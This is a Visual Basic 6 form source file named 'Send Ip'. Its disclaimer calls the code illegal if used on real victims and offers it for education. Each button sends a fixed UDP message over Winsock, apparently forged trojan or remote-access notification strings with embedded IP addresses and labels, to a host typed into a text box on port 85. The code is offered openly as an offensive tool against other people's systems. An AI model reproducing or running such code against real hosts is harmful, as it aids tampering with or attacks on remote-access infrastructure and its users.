VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form formnoty 
   Caption         =   "Send Ip"
   ClientHeight    =   4215
   ClientLeft      =   225
   ClientTop       =   810
   ClientWidth     =   6165
   Icon            =   "Forme1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4215
   ScaleWidth      =   6165
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command11 
      Caption         =   "Load"
      Height          =   375
      Left            =   2880
      TabIndex        =   12
      Top             =   3600
      Width           =   2295
   End
   Begin VB.CommandButton Command7 
      Caption         =   "version 6"
      Height          =   495
      Left            =   2400
      TabIndex        =   11
      Top             =   1080
      Width           =   2175
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Before version 6"
      Height          =   495
      Left            =   0
      TabIndex        =   10
      Top             =   1080
      Width           =   2055
   End
   Begin VB.CommandButton Command5 
      Caption         =   "other"
      Height          =   375
      Left            =   2760
      TabIndex        =   9
      Top             =   0
      Width           =   1335
   End
   Begin VB.CommandButton Command4 
      Caption         =   "picture demo"
      Height          =   375
      Left            =   0
      TabIndex        =   8
      Top             =   2760
      Width           =   1335
   End
   Begin VB.CommandButton Command1 
      Caption         =   "v7"
      Height          =   375
      Left            =   0
      TabIndex        =   7
      Top             =   2280
      Width           =   975
   End
   Begin VB.CommandButton Command10 
      Caption         =   "t2001"
      Height          =   375
      Left            =   0
      TabIndex        =   6
      Top             =   120
      Width           =   1575
   End
   Begin VB.CommandButton Command9 
      Caption         =   "alqa3eeda"
      Height          =   375
      Left            =   0
      TabIndex        =   5
      Top             =   1800
      Width           =   1815
   End
   Begin VB.CommandButton Command8 
      Caption         =   "wn99"
      Height          =   375
      Left            =   0
      TabIndex        =   4
      Top             =   600
      Width           =   1575
   End
   Begin VB.TextBox Text3 
      BeginProperty Font 
         Name            =   "Impact"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   645
      Left            =   2760
      MultiLine       =   -1  'True
      TabIndex        =   3
      Text            =   "Forme1.frx":030A
      Top             =   1920
      Width           =   2655
   End
   Begin VB.CommandButton Command3 
      BackColor       =   &H00E0E0E0&
      Caption         =   "waznek dahab"
      Height          =   255
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   2
      Top             =   3240
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   4680
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H00E0E0E0&
      Caption         =   "om"
      Height          =   255
      Left            =   2520
      Style           =   1  'Graphical
      TabIndex        =   1
      Top             =   480
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   3000
      TabIndex        =   0
      Text            =   "ur domain.com"
      Top             =   2880
      Width           =   1455
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   600
      Top             =   1560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "formnoty"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
Dim m As Integer
Private Sub Command1_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7"

End Sub

Private Sub Command10_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 t2001"
End Sub

Private Sub Command11_Click()

With Winsock2
    .Protocol = sckUDPProtocol

    .RemotePort = 85
    .RemoteHost = Trim(Text1.Text)
End With
End Sub

Private Sub Command2_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 all-omania"
End Sub

Private Sub Command3_Click()
'Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 " & Text3.Text
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 waznek dahab"

End Sub

Private Sub Command4_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 picture-demo2"
End Sub

Private Sub Command5_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] rabsha"
End Sub

Private Sub Command6_Click()
Winsock2.SendData "|ssebees|5|212.72.2.1|temp2005"
End Sub

Private Sub Command7_Click()
Winsock2.SendData "notypc|ssebees|ver 16|212.72.2.1|t2005"
End Sub

Private Sub Command8_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 wn99"
End Sub

Private Sub Command9_Click()
Winsock2.SendData "tiger/omantel[***]v7 212.72.2.23 [*] v7 alqaa3eda"
End Sub

Private Sub Timer1_Timer()
'Winsock2.SendData frmLogin.txtUserName & "  Logedin"
Timer1.Enabled = False
End Sub
